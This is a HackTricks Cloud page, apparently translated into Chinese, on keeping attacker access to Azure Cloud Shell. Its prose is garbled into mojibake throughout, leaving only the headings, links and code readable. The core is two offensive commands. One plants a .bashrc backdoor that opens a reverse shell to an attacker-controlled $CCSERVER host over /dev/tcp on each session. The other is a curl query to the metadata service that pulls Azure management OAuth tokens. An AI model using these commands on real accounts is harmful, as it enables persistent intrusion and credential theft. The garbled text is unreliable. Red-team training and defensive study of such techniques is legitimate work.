# Az - Cloud Shell Persistence

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## Cloud Shell Persistence

Azure Cloud Shell æä¾›å‘½ä»¤è¡Œè®¿é—®ä»¥ç®¡ç† Azure èµ„æºï¼Œå…·æœ‰æŒä¹…å­˜å‚¨å’Œè‡ªåŠ¨èº«ä»½éªŒè¯ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨æŒä¹…ä¸»ç›®å½•ä¸­æ”¾ç½®åé—¨æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼š

* **æŒä¹…å­˜å‚¨**ï¼šAzure Cloud Shell çš„ä¸»ç›®å½•æŒ‚è½½åœ¨ Azure æ–‡ä»¶å…±äº«ä¸Šï¼Œå³ä½¿ä¼šè¯ç»“æŸåä¹Ÿä¿æŒä¸å˜ã€‚
* **å¯åŠ¨è„šæœ¬**ï¼šåƒ .bashrc è¿™æ ·çš„æ–‡ä»¶åœ¨æ¯ä¸ªä¼šè¯å¼€å§‹æ—¶è‡ªåŠ¨æ‰§è¡Œï¼Œå…è®¸åœ¨äº‘ shell å¯åŠ¨æ—¶è¿›è¡ŒæŒä¹…æ‰§è¡Œã€‚

åœ¨ .bashrc ä¸­çš„ç¤ºä¾‹åé—¨ï¼š

{% code overflow="wrap" %}
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/$CCSERVER/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

è¿™ä¸ªåé—¨å¯ä»¥åœ¨ç”¨æˆ·å®Œæˆäº‘ shell åçš„ 5 åˆ†é’Ÿå†…æ‰§è¡Œå‘½ä»¤ã€‚

æ­¤å¤–ï¼ŒæŸ¥è¯¢ Azure çš„å…ƒæ•°æ®æœåŠ¡ä»¥è·å–å®ä¾‹è¯¦ç»†ä¿¡æ¯å’Œä»¤ç‰Œï¼š
{% code overflow="wrap" %}
```bash
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -s
```
{% endcode %}


{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
